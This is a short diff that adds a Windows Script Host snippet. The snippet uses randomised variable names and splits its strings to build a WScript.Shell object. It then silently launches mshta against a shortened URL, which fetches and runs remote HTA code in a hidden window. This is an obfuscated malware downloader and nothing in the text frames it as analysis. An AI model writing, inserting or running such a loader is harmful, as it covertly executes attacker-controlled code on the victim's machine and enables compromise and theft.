@@ -1,0 +1,5 @@
+oieirhhd = ("cript.Sh")
+var jzqgbeza = WScript.CreateObject("WS"+oieirhhd+"ell")
+zoxginyt = ("msh")
+bmblkqev = ("ta ")
+jzqgbeza.Run((zoxginyt+bmblkqev)+" https://cutt.ly/rbIpA7z",0)
